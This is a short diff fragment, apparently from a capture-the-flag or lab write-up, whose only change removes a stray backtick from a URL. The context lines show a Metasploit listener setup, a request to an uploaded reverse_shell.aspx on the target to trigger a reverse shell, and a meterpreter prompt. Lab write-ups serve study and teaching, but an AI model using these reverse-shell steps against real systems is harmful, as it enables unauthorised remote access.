@@ -64,7 +64,7 @@ set LHOST 10.10.14.73
 set LPORT 1234
 run</pre>
 
-- Browse to `http://10.10.10.5/reverse_shell.aspx</pre>
+- Browse to http://10.10.10.5/reverse_shell.aspx</pre>
 - Receive reverse shell on listener
 
 <pre>meterpreter > getuid
